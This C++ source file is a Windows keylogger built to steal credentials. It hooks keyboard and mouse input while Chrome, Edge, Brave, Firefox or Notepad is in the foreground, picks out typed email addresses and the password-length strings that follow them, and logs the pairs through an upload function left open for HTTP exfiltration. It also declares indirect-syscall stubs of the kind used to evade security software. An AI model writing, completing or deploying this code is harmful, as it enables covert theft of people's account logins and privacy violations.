#include <windows.h>
#include <winhttp.h>
#include <psapi.h>
#include <string>
#include <regex>
#include <sstream>
#include <fstream>
#include <shlobj.h>
#include <vector>
#include <algorithm>
#include <iomanip>
#include <ctime>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ole32.lib")

extern "C" {
    DWORD sys_number = 0;
    UINT_PTR sys_addr = 0;
}
extern "C" void DoIndirectSyscall();

// --- LOGGING SYSTEM ---
void WriteLog(std::string text) {
    char desktopPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath) == S_OK) {
        std::string fullPath = std::string(desktopPath) + "\\monitor_log.txt";
        std::ofstream logFile(fullPath, std::ios::app);
        if (logFile.is_open()) {
            std::time_t now = std::time(0);
            struct tm ltm;
            localtime_s(&ltm, &now);
            logFile << "[" << ltm.tm_hour << ":" << ltm.tm_min << ":" << ltm.tm_sec << "] " << text << std::endl;
            logFile.close();
        }
    }
}

// --- TARGET LIST ---
std::vector<std::string> TARGET_APPS = { "chrome.exe", "msedge.exe", "brave.exe", "firefox.exe", "notepad.exe" };

bool IsTargetAppActive() {
    DWORD processId;
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return false;
    GetWindowThreadProcessId(hwnd, &processId);
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
    if (hProcess) {
        char buffer[MAX_PATH];
        DWORD size = sizeof(buffer);
        if (QueryFullProcessImageNameA(hProcess, 0, buffer, &size)) {
            std::string path(buffer);
            std::string exeName = path.substr(path.find_last_of("\\/") + 1);
            std::transform(exeName.begin(), exeName.end(), exeName.begin(), ::tolower);
            for (const std::string& target : TARGET_APPS) {
                if (exeName == target) { CloseHandle(hProcess); return true; }
            }
        }
        CloseHandle(hProcess);
    }
    return false;
}

// --- CORE LOGIC ---
std::string buffer = "";
std::string savedEmail = "";

bool IsEmail(const std::string& s) {
    const std::regex e_reg(R"((\w+)(\.|_)?(\w*)@(\w+)(\.(\w+))+)", std::regex_constants::icase);
    return std::regex_match(s, e_reg);
}

void UploadData(std::string email, std::string pass) {
    WriteLog("DATA READY FOR UPLOAD -> Email: " + email + " | Password: " + pass);
    // Future: Insert your WinHttp POST logic here
}

void ProcessBuffer() {
    if (buffer.empty()) return;
    if (buffer.find(' ') != std::string::npos) { buffer.clear(); return; }

    if (IsEmail(buffer)) {
        savedEmail = buffer;
        WriteLog("Captured Email: " + savedEmail);
    } else if (buffer.length() >= 8) {
        std::string emailToUpload = savedEmail.empty() ? "N/A (Standalone)" : savedEmail;
        UploadData(emailToUpload, buffer); 
        savedEmail.clear(); 
    }
    buffer.clear();
}

// --- CALLBACKS ---
LRESULT CALLBACK KeyProc(int n, WPARAM w, LPARAM l) {
    if (n == HC_ACTION && w == WM_KEYDOWN) {
        if (!IsTargetAppActive()) return CallNextHookEx(NULL, n, w, l);
        
        KBDLLHOOKSTRUCT* k = (KBDLLHOOKSTRUCT*)l;
        bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;

        if (k->vkCode == VK_RETURN || k->vkCode == VK_TAB) {
            ProcessBuffer();
        } else if (k->vkCode == VK_BACK) {
            if (!buffer.empty()) buffer.pop_back();
        } else {
            if (k->vkCode >= 0x41 && k->vkCode <= 0x5A) { // A-Z
                char c = (char)k->vkCode;
                if (!shift) c = (char)tolower(c);
                buffer += c;
            } else if (k->vkCode >= 0x30 && k->vkCode <= 0x39) { // 0-9
                if (shift && k->vkCode == '2') buffer += "@";
                else if (shift && k->vkCode == '1') buffer += "!";
                else buffer += (char)k->vkCode;
            } else if (k->vkCode == VK_OEM_PERIOD) buffer += ".";
        }
    }
    return CallNextHookEx(NULL, n, w, l);
}

LRESULT CALLBACK MouseProc(int n, WPARAM w, LPARAM l) {
    if (n == HC_ACTION && w == WM_LBUTTONDOWN) {
        if (IsTargetAppActive()) ProcessBuffer();
    }
    return CallNextHookEx(NULL, n, w, l);
}

// --- ENTRY POINT ---
int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {
    WriteLog("=== MONITORING STARTED ===");

    HHOOK hKey = SetWindowsHookEx(WH_KEYBOARD_LL, KeyProc, h, 0);
    HHOOK hMouse = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, h, 0);

    if (!hKey || !hMouse) {
        WriteLog("ERROR: Hook Installation Failed");
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hKey);
    UnhookWindowsHookEx(hMouse);
    return 0;
}
